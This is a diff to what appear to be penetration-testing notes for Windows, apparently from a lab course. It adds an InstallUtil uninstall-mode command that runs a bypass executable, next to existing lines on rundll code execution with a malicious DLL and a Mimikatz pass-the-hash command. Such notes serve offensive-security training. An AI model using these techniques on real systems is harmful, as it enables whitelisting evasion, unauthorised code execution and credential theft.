@@ -311,6 +311,9 @@ Includes web services (not just port 80)
 - Check if there's a 3rd party scripting engine such as python or if JRE for java is on there
 - See if they have DLL restrictions. Get codexec with `rundll`: `C:\windows\system32\rundll.exe EvilDll.dll,maliciousFunc` (use `C:\Windows\SysWOW64\rundll.exe` for 64 bit payloads)
 - Use `InstallUtil` with the uninstall capability (doesn't require admin privs, but install does)
+  ```
+  C:\> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\lowpriv\bypass.exe
+  ```
 
 ## Mimikatz
 You can wrap these in for ex. `PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:lemons /domain:dollarcorp.moneycorp.local /ntlm:NThashHERE /run:powershell.exe`
